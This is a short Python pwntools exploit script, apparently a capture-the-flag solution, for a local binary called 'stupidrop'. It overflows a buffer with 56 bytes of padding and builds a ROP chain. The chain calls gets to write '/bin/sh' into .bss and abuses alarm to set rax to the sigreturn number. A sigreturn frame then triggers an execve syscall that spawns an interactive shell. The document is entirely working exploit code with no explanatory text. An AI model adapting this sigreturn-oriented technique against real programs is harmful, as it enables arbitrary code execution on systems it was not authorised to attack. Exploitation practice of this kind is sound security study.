from pwn import *
#context_level='DEBUG'

p = process("./stupidrop")
elf = ELF("./stupidrop")

def main():
	context.arch="amd64"

	syscall = p64(0x40063e)
	pop_rdi = p64(0x4006a3)

	gets = p64(elf.symbols['gets'])
	alarm = p64(elf.symbols['alarm'])

	bss_addr = p64(0x00601050)

	payload = ""
	payload += "A"*56
	payload += pop_rdi
	payload += bss_addr
	payload += gets

	payload += pop_rdi
	payload += p64(0xf)
	payload += alarm
	payload += pop_rdi
	payload += p64(0x0)
	payload += alarm

	frame = SigreturnFrame()

	frame.rip = syscall
	frame.rax = 0x3b
	frame.rdi = bss_addr
	frame.rsi = 0x0
	frame.rdx = 0x0

	payload += syscall
	payload += str(frame)

	p.sendline(payload)
	p.sendline("/bin/sh\x00")

	p.interactive()

if __name__ == "__main__":
	main()
